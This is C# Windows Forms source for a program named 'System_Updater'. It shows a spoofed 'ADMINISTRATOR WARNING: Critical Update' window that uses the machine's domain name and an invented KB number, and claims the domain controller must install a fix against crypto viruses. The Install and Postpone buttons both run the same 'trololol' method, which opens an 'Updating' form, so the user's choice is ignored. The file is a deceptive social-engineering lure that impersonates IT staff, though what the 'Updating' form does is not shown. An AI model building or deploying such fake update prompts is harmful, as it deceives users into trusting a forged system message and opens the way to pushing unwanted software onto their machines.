using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace System_Updater
{
    public partial class Form1 : Form
    {

        public String domname = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
        public Form1()
        {
            //String domname = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            if (domname == "")
            {
                domname = Environment.MachineName;
            }

            InitializeComponent();
            this.Text = domname + " ADMINISTRATOR WARNING: Critical Update";
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            label1.Text = "Critical update for " + Environment.OSVersion + ". KB9191564";

            textBox1.AppendText("Please note that the Domain Controller for " + domname + " needs to deploy a critical update to your system as a precautionary measure against the latest wave of Crypto viruses being distributed on the internet. To install the update please click the install button below, alternatively, click the postpone button to schedule the update at next system reboot.");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            trololol();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            trololol();
        }

        public static void trololol()
        {
            Updating upd = new Updating();
            upd.Show();
        }
        
    }
}
